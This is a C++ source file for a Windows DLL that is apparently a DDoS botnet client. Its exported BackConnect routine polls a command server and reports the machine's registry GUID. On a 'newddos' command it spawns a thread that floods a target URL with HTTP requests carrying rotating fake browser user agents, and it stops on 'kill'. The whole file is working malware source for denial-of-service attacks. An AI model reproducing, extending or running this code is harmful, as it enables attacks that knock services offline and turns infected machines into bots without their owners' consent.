

#include "pch.h"
#include "DarkRequest.h"
#include "Flood.h"
#include <thread>
#include <stdio.h> 
#include <thread>
#include <vector>
#include <sstream>
#include <utility>




		extern "C"
		{
			bool task1_running = false;
			bool stopTask = false;
			std::string globalTaskIDRunning = "0";

			void split(const std::string& str, const std::string& delimiter, std::vector<std::string>& arr) {
				
				int strleng = str.length();
				int delleng = delimiter.length();
				//if (delleng == 0)
					//return arr;//no change
				int i = 0;
				int k = 0;
				while (i < strleng)
				{
					int j = 0;
					while (i + j < strleng && j < delleng && str[i + j] == delimiter[j])
						j++;
					if (j == delleng)//found delimiter
					{
						arr.push_back(str.substr(k, i - k));
						i += delleng;
						k = i;
					}
					else {
						i++;
					}
				}
				arr.push_back(str.substr(k, i - k));
				//return arr;
			}

			static std::string GetMachineGUID()
			{
				std::string ret;
				char value[64];
				DWORD size = _countof(value);
				DWORD type = REG_SZ;
				HKEY key;
				LONG retKey = ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &key);
				LONG retVal = ::RegQueryValueExA(key, "MachineGuid", nullptr, &type, (LPBYTE)value, &size);
				if (retKey == ERROR_SUCCESS && retVal == ERROR_SUCCESS) {
					ret = value;
				}
				::RegCloseKey(key);
				return ret;
			}
			
			void task1(std::string method,std::string targetip, std::string port, std::string maxtime) {
				while (true)
				{
					if (stopTask) {
						break;
					}
					//Only Example Loris currently

					std::cout << "Running \n";
					task1_running = true;

					//std::string param = random_string(20)+"="+ random_string(20) + "&"+ random_string(20) +"="+ random_string(20) + "&" + random_string(20) + "=" + random_string(20) + "&" + random_string(20) + "=" + random_string(20);
					std::string param = "";
					char* host;
					char* path;
					HTTPURL u(targetip);
					int min = 1;
					int max = 4;

					host = (char*)u.domain.c_str();
					path = (char*)u.path.c_str();

					TCHAR hdrs[] = TEXT("Connection: Keep-Alive");
					LPVOID frmdata = (LPVOID)param.c_str();
					LPCSTR accept[2] = { "text/plain", NULL };

					std::vector<std::string> v = {
						"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
						"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)",
						"Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
						"Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0",
						"Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19",
						"Mozilla/4.0 (compatible; MSIE 6.0; Linux i686 ; en) Opera 9.70",
						"Mozilla/4.0 (compatible; MSIE 6.0; Mac_PowerPC; en) Opera 9.24",
						"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; YPC 3.2.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)",
						"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.22",
						"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
						"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)",
						"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705; Media Center PC 3.1; Alexa Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
						"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
						"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; OfficeLiveConnector.1.4; OfficeLivePatch.1.3; yie8)",
						"Opera/9.10 (Windows NT 5.1; U; it)",
						"Opera / 9.10 (X11; Linux i686; U; en)",
						"Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00"
					};

					std::random_device random_device;
					std::mt19937 engine{ random_device() };
					std::uniform_int_distribution<int> dist(0, v.size() - 1);


					int time = 60;
					for (int i = 0; i < time * 20; i++) {
						HINTERNET hSession;
						HINTERNET hConnect;
						HINTERNET hRequest;
						std::string random_element = v[dist(engine)];
						//std::cout << random_element;

						std::random_device rd;
						std::mt19937 mt(rd());
						std::uniform_int_distribution<int> dist(1, 2);
						std::string method = "POST";
						if (dist(mt) == 1) {
							std::string method = "GET";
						}

						hSession = InternetOpen(random_element.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
						hConnect = InternetConnect(hSession, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
						hRequest = HttpOpenRequest(hConnect, method.c_str(), path, NULL, NULL, accept, INTERNET_FLAG_RESYNCHRONIZE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD, 1);

						if (!HttpSendRequest(hRequest,
							hdrs,
							strlen(hdrs),
							frmdata,
							strlen(param.c_str()))) {
							DWORD errorCode = GetLastError();
							std::cout << errorCode;
						}
						//HttpSendRequest(hRequest, hdrs, strlen(hdrs), frmdata, strlen(param.c_str()));
						DWORD rSize;
						char tmp[1024 + 1];
						string szBuffer;

						while (InternetReadFile(hRequest, tmp, 1024, &rSize) && rSize > 0) {}

						InternetCloseHandle(hSession);
						InternetCloseHandle(hConnect);
						InternetCloseHandle(hRequest);
					}

				
				}
			}

	

			__declspec(dllexport) void BackConnect(std::string url)
			{
				std::thread hThread;

				while (true) {
					//std::cout << "Waiting \n";
					int n = 20;
					std::vector<thread> threads(n);
					std::string post = "hwid=" + GetMachineGUID() + "&taskrunning=" + std::to_string(task1_running)+"&taskid="+ globalTaskIDRunning;

					std::string response = postRequest(url, post);
				


		
					if(response.find("newddos") != std::string::npos) {
						std::vector<std::string> v;
			
						split(response,";",v);
						
						std::string taskid = v[1];
						std::string method = v[2];
						std::string targetip = v[3];
						std::string port = v[4];
						std::string maxtime = v[5];

						//std::istringstream iss
						globalTaskIDRunning = taskid;
			

					

						if (!task1_running) {
							stopTask = false;
				

							/*
							
							for (int i = 0; i < n; i++) {
								threads[i] = thread(task1, method, targetip, port, maxtime);
							}


							for (auto& th : threads) {
								th.join();
							}
							*/


							hThread = thread(task1, method, targetip, port, maxtime);
						}
					}

					if (response == "kill") {
			
						globalTaskIDRunning = "0";
						task1_running = false;
						stopTask = true;
						/*
						for (auto& th : threads) {
							th.detach();
						}
						*/

						//hThread.detach();
						//hThread.~thread();
					
						hThread.detach();
						//hThread.native_handle().detach();
						CloseHandle(hThread.native_handle());
					}

					Sleep(1000);
				}

			}



		

	
		}